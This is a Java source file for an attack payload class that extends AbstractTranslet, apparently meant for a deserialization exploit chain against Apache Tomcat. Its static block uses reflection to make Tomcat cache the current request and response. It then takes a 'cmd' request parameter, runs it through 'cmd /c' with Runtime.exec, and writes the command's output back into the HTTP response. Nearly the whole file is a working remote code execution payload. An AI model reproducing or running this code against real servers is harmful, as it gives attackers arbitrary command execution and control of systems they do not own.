import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class Payload extends AbstractTranslet {
    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse =
                    (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
            String cmd = lastServicedRequest != null
                    ? lastServicedRequest.get().getParameter("cmd")
                    : null;
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            } else if (cmd != null) {
                ServletResponse responseFacade = lastServicedResponse.get();
                responseFacade.getWriter();
                java.io.Writer w = responseFacade.getWriter();
//                Field responseField = ResponseFacade.class.getDeclaredField("response");
//                responseField.setAccessible(true);
//                Response response = (Response) responseField.get(responseFacade);
//                Field usingWriter = Response.class.getDeclaredField("usingWriter");
//                usingWriter.setAccessible(true);
//                usingWriter.set((Object) response, Boolean.FALSE);
                InputStream in = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd}).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                w.write(output);
                w.flush();
            }

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
